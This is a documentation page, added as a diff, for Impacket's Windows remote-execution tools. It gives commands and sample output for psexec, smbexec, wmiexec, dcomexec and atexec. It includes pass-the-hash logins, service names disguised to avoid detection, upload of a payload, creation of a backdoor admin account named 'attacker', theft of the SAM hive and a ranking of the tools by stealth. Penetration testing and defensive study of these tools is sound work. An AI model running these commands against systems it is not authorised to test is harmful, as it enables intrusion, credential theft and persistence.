@@ -1,0 +1,438 @@
+---
+title: "Remote Execution Tools"
+description: "Execute commands on remote Windows systems using various protocols"
+---
+
+Impacket provides multiple methods for executing commands on remote Windows systems, each using different protocols and execution contexts.
+
+## Tool Comparison
+
+| Tool | Protocol | Context | Stealth | Requirements |
+|------|----------|---------|---------|-------------|
+| **psexec.py** | SMB + RemComSvc | SYSTEM | Low | Admin, SMB access |
+| **smbexec.py** | SMB + Service | SYSTEM | Low | Admin, SMB access |
+| **wmiexec.py** | WMI/DCOM | User | Medium | Admin, DCOM ports |
+| **dcomexec.py** | DCOM Objects | User | Medium | Admin, DCOM ports |
+| **atexec.py** | Task Scheduler | SYSTEM | Medium | Admin, Task Scheduler |
+
+## psexec.py
+
+PsExec-like functionality using RemComSvc. Executes commands as SYSTEM through a temporary service.
+
+### Basic Usage
+
+<Tabs>
+  <Tab title="Interactive Shell">
+    ```bash
+    # Password authentication
+    psexec.py DOMAIN/username:password@target
+    
+    # Pass-the-hash
+    psexec.py DOMAIN/username@target -hashes :NTHASH
+    
+    # Kerberos authentication
+    psexec.py DOMAIN/username@target -k -no-pass -dc-ip DC_IP
+    ```
+  </Tab>
+  <Tab title="Single Command">
+    ```bash
+    # Execute single command
+    psexec.py DOMAIN/user:pass@target "whoami"
+    psexec.py DOMAIN/user:pass@target "ipconfig /all"
+    
+    # Run PowerShell
+    psexec.py DOMAIN/user@target -hashes :HASH "powershell -c Get-Process"
+    ```
+  </Tab>
+  <Tab title="File Upload & Execute">
+    ```bash
+    # Copy and execute a file
+    psexec.py DOMAIN/user:pass@target -copy-file /path/to/file.exe
+    
+    # Specify custom service name
+    psexec.py DOMAIN/user:pass@target -service-name CustomSvc
+    ```
+  </Tab>
+</Tabs>
+
+### Advanced Options
+
+<AccordionGroup>
+  <Accordion title="Custom Service Configuration">
+    ```bash
+    # Custom service name (avoid detection)
+    psexec.py domain/user@target -service-name WinDefendSvc
+    
+    # Custom remote binary name
+    psexec.py domain/user@target -remote-binary-name svchost.exe
+    ```
+  </Accordion>
+  <Accordion title="Copy & Execute Files">
+    ```bash
+    # Upload and execute binary
+    psexec.py domain/user@target -copy-file payload.exe
+    
+    # Execute with arguments
+    psexec.py domain/user@target -copy-file tool.exe "arg1 arg2"
+    ```
+  </Accordion>
+  <Accordion title="Port & Timeout Settings">
+    ```bash
+    # Custom SMB port
+    psexec.py domain/user@target -port 8445
+    
+    # Target IP (when DNS fails)
+    psexec.py domain/user@hostname -target-ip 10.0.0.5
+    ```
+  </Accordion>
+</AccordionGroup>
+
+### Example Output
+
+```bash
+$ psexec.py CORP/admin:password@10.0.0.50
+Impacket v0.12.0 - Copyright 2023 Fortra
+
+[*] Requesting shares on 10.0.0.50.....
+[*] Found writable share ADMIN$
+[*] Uploading file HjKDpnmR.exe
+[*] Opening SVCManager on 10.0.0.50.....
+[*] Creating service RemComSvc on 10.0.0.50.....
+[*] Starting service RemComSvc.....
+[!] Press help for extra shell commands
+
+C:\Windows\system32> whoami
+nt authority\system
+
+C:\Windows\system32> hostname
+WIN-SERVER01
+```
+
+## smbexec.py
+
+Executes commands through a temporary service without uploading a binary. Uses local SMB server in server mode.
+
+### Basic Usage
+
+<Tabs>
+  <Tab title="Share Mode">
+    ```bash
+    # Use existing writable share
+    smbexec.py DOMAIN/user:pass@target -share C$
+    smbexec.py DOMAIN/user@target -hashes :HASH -share ADMIN$
+    
+    # Auto-detect writable share
+    smbexec.py DOMAIN/user:pass@target
+    ```
+  </Tab>
+  <Tab title="Server Mode">
+    ```bash
+    # Launch local SMB server (requires root for port 445)
+    sudo smbexec.py DOMAIN/user:pass@target -mode server
+    
+    # With custom service name
+    sudo smbexec.py DOMAIN/user@target -hashes :HASH -mode server -service-name svc
+    ```
+  </Tab>
+  <Tab title="Shell Types">
+    ```bash
+    # CMD shell (default)
+    smbexec.py domain/user:pass@target
+    
+    # PowerShell
+    smbexec.py domain/user:pass@target -shell-type powershell
+    ```
+  </Tab>
+</Tabs>
+
+### Characteristics
+
+<CardGroup cols={2}>
+  <Card title="Advantages">
+    - No binary upload required
+    - Works with any writable share
+    - Server mode for restricted environments
+  </Card>
+  <Card title="Disadvantages">
+    - Generates event logs (service creation)
+    - Commands timeout if they run too long
+    - Not fully interactive
+  </Card>
+</CardGroup>
+
+### Example
+
+```bash
+$ smbexec.py CORP/admin@10.0.0.50 -hashes :8846f7eaee8fb117ad06bdd830b7586c
+Impacket v0.12.0 - Copyright 2023 Fortra
+
+[!] Launching semi-interactive shell - Careful what you execute
+C:\Windows\system32> net user attacker P@ssw0rd! /add
+The command completed successfully.
+
+C:\Windows\system32> net localgroup administrators attacker /add
+The command completed successfully.
+```
+
+## wmiexec.py
+
+Executes commands through WMI. Runs as the authenticated user (not SYSTEM) with less event log noise.
+
+### Basic Usage
+
+<Tabs>
+  <Tab title="Interactive Shell">
+    ```bash
+    # Standard authentication
+    wmiexec.py DOMAIN/user:password@target
+    
+    # Pass-the-hash
+    wmiexec.py DOMAIN/user@target -hashes LMHASH:NTHASH
+    
+    # Kerberos
+    wmiexec.py DOMAIN/user@target -k -no-pass
+    ```
+  </Tab>
+  <Tab title="Single Command">
+    ```bash
+    # Execute command and exit
+    wmiexec.py DOMAIN/user:pass@target "hostname"
+    wmiexec.py DOMAIN/user@target -hashes :HASH "ipconfig"
+    ```
+  </Tab>
+  <Tab title="No Output Mode">
+    ```bash
+    # Execute without retrieving output (stealth)
+    wmiexec.py DOMAIN/user:pass@target -nooutput "command"
+    ```
+  </Tab>
+</Tabs>
+
+### Advanced Features
+
+<AccordionGroup>
+  <Accordion title="Shell Types">
+    ```bash
+    # CMD shell (default)
+    wmiexec.py domain/user:pass@target
+    
+    # PowerShell shell
+    wmiexec.py domain/user:pass@target -shell-type powershell
+    
+    # Execute single PowerShell command
+    wmiexec.py domain/user:pass@target -shell-type powershell "Get-Process"
+    ```
+  </Accordion>
+  <Accordion title="Custom Share">
+    ```bash
+    # Use specific share for output
+    wmiexec.py domain/user:pass@target -share C$
+    wmiexec.py domain/user:pass@target -share ADMIN$
+    ```
+  </Accordion>
+  <Accordion title="File Operations">
+    ```bash
+    # Upload file
+    C:\> lput /local/file.txt C:\Windows\Temp\file.txt
+    
+    # Download file
+    C:\> lget C:\Windows\System32\config\SAM
+    
+    # Change local directory
+    C:\> lcd /tmp
+    ```
+  </Accordion>
+</AccordionGroup>
+
+### Example Session
+
+```bash
+$ wmiexec.py CORP/admin:P@ssw0rd@10.0.0.50
+Impacket v0.12.0 - Copyright 2023 Fortra
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+
+C:\> whoami
+corp\admin
+
+C:\> powershell -c "Get-WmiObject Win32_OperatingSystem | Select Caption"
+Caption
+-------
+Microsoft Windows Server 2019 Standard
+```
+
+## dcomexec.py
+
+Executes commands through DCOM objects. Supports multiple DCOM methods.
+
+### DCOM Objects
+
+<Tabs>
+  <Tab title="MMC20.Application">
+    ```bash
+    # Default method (Windows 7/10/Server 2012R2+)
+    dcomexec.py DOMAIN/user:pass@target
+    dcomexec.py DOMAIN/user:pass@target -object MMC20
+    ```
+  </Tab>
+  <Tab title="ShellWindows">
+    ```bash
+    # Alternative method
+    dcomexec.py DOMAIN/user:pass@target -object ShellWindows
+    ```
+  </Tab>
+  <Tab title="ShellBrowserWindow">
+    ```bash
+    # Windows 10/Server 2012R2
+    dcomexec.py DOMAIN/user:pass@target -object ShellBrowserWindow
+    ```
+  </Tab>
+</Tabs>
+
+### Usage Examples
+
+```bash
+# Interactive shell with MMC20
+dcomexec.py CORP/admin@10.0.0.50 -hashes :NTHASH
+
+# Single command execution
+dcomexec.py CORP/admin:pass@target -object ShellWindows "whoami"
+
+# PowerShell shell
+dcomexec.py CORP/admin@target -hashes :HASH -shell-type powershell
+
+# No output mode
+dcomexec.py CORP/admin:pass@target -nooutput "command"
+```
+
+## atexec.py
+
+Executes commands via Task Scheduler. Runs as SYSTEM with less noise than service-based methods.
+
+### Basic Usage
+
+<Tabs>
+  <Tab title="Standard Execution">
+    ```bash
+    # Execute command and retrieve output
+    atexec.py DOMAIN/user:password@target "whoami"
+    atexec.py DOMAIN/user@target -hashes :HASH "ipconfig /all"
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash
+    # Kerberos authentication
+    atexec.py DOMAIN/user@target -k -no-pass "hostname"
+    atexec.py DOMAIN/user:pass@target -k -dc-ip 10.0.0.1 "whoami"
+    ```
+  </Tab>
+  <Tab title="Interactive Session">
+    ```bash
+    # Execute PowerShell session (experimental)
+    atexec.py domain/user:pass@target -session-id 1 "powershell"
+    ```
+  </Tab>
+</Tabs>
+
+### Example
+
+```bash
+$ atexec.py CORP/admin:P@ssw0rd@10.0.0.50 "whoami"
+Impacket v0.12.0 - Copyright 2023 Fortra
+
+[!] This will work ONLY on Windows >= Vista
+[*] Creating task \hKtMjRxL
+[*] Running task \hKtMjRxL
+[*] Deleting task \hKtMjRxL
+[*] Attempting to read ADMIN$\Temp\hKtMjRxL.tmp
+nt authority\system
+```
+
+## Choosing the Right Tool
+
+<Tabs>
+  <Tab title="Stealth Priority">
+    **Most Stealthy to Least:**
+    
+    1. **wmiexec.py** - Minimal event logs, runs as user
+    2. **dcomexec.py** - DCOM-based, less common detection
+    3. **atexec.py** - Task Scheduler, moderate logging
+    4. **smbexec.py** - Service creation logs
+    5. **psexec.py** - Service creation + binary upload
+  </Tab>
+  <Tab title="Reliability">
+    **Most Reliable to Least:**
+    
+    1. **psexec.py** - Time-tested, most compatible
+    2. **wmiexec.py** - Very reliable, requires DCOM
+    3. **smbexec.py** - Reliable, some edge cases
+    4. **atexec.py** - Generally reliable, Vista+
+    5. **dcomexec.py** - Version-dependent DCOM objects
+  </Tab>
+  <Tab title="Environment">
+    **When to Use Each:**
+    
+    - **psexec.py**: Need SYSTEM, full compatibility
+    - **wmiexec.py**: DCOM available, prefer stealth
+    - **smbexec.py**: No writable shares, use server mode
+    - **atexec.py**: Task Scheduler available, need SYSTEM
+    - **dcomexec.py**: Alternative when others fail
+  </Tab>
+</Tabs>
+
+## Common Issues
+
+<AccordionGroup>
+  <Accordion title="Access Denied">
+    ```bash
+    # Verify credentials work
+    crackmapexec smb target -u user -p password
+    
+    # Check if user is local admin
+    crackmapexec smb target -u user -p password --local-auth
+    
+    # Try different authentication method
+    tool.py domain/user@target -hashes :NTHASH
+    ```
+  </Accordion>
+  <Accordion title="Connection Refused / Firewall">
+    ```bash
+    # Test SMB connectivity (445)
+    nc -zv target 445
+    
+    # Test WMI/DCOM ports (135, 49152-65535)
+    nmap -p 135,445 target
+    
+    # Use specific target IP
+    tool.py domain/user@hostname -target-ip 10.0.0.5
+    ```
+  </Accordion>
+  <Accordion title="WMI / DCOM Errors">
+    ```bash
+    # Ensure DCOM is enabled on target
+    # Check firewall allows ports 135 + dynamic RPC
+    
+    # Try different DCOM object
+    dcomexec.py domain/user@target -object ShellWindows
+    
+    # Fall back to SMB-based method
+    smbexec.py domain/user@target
+    ```
+  </Accordion>
+</AccordionGroup>
+
+## Next Steps
+
+<CardGroup cols={2}>
+  <Card title="Credential Dumping" icon="key" href="/examples/credential-dumping">
+    Extract credentials after gaining access
+  </Card>
+  <Card title="SMB Operations" icon="folder-open" href="/examples/smb-operations">
+    Browse shares and access files
+  </Card>
+  <Card title="LDAP Operations" icon="sitemap" href="/examples/ldap-operations">
+    Enumerate and modify Active Directory
+  </Card>
+</CardGroup>
